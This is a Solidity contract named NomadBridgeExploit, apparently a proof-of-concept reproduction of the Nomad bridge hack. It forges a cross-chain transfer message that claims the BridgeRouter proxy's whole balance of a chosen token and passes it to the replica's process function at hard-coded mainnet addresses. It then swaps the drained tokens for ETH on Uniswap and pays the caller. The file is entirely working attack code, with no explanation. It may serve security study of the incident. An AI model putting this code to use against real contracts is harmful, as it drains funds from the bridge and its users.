// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "./NomadBridge/Interfaces.sol";
import "./NomadBridge/TypedMemView.sol";
import "./NomadBridge/Message.sol";
import "./NomadBridge/BridgeMessage.sol";
import "v2-periphery/interfaces/IUniswapV2Router02.sol";

contract NomadBridgeExploit {
    using TypedMemView for bytes;
    using TypedMemView for bytes29;
    using BridgeMessage for bytes29;
    using Message for bytes29;

    address constant replicaAddress = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
    address constant proxyAddress = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3; // BridgeRouter
    address constant prevBridgeRouterAddress =
        0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;

    IUniswapV2Router02 constant uniswapRouter =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address constant wethAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function exploit(address tokenAddress) public {
        IReplica replica = IReplica(replicaAddress);
        IBridgeRouter bridgeRouter = IBridgeRouter(proxyAddress);
        ITokenRegistry tokenRegistry = bridgeRouter.tokenRegistry();
        ERC20 token = ERC20(tokenAddress);

        (uint32 domain, bytes32 id) = tokenRegistry.getTokenId(tokenAddress);
        // Note: domain = destinationDomain

        bytes29 action = BridgeMessage.formatTransfer(
            bytes32(uint256(uint160(address(this)))),
            token.balanceOf(proxyAddress),
            BridgeMessage.getDetailsHash(token.name(), token.symbol(), token.decimals())
        );
        bytes29 tokenId = BridgeMessage.formatTokenId(domain, id);
        bytes memory rawBridgeMessage =
            BridgeMessage.formatMessage(tokenId, action);

        bytes memory rawMessage = Message.formatMessage(
            1650811245, // originDomain
            bytes32(uint256(uint160(prevBridgeRouterAddress))), // sender
            uint32(block.timestamp), // nonce
            6648936, // destinationDomain
            bytes32(uint256(uint160(proxyAddress))), // recipient
            rawBridgeMessage
        );

        replica.process(rawMessage);

        token.approve(address(uniswapRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenAddress;
        path[1] = wethAddress;
        uniswapRouter.swapExactTokensForETH(
            token.balanceOf(address(this)), 0, path, msg.sender, type(uint256).max
        );
    }
}
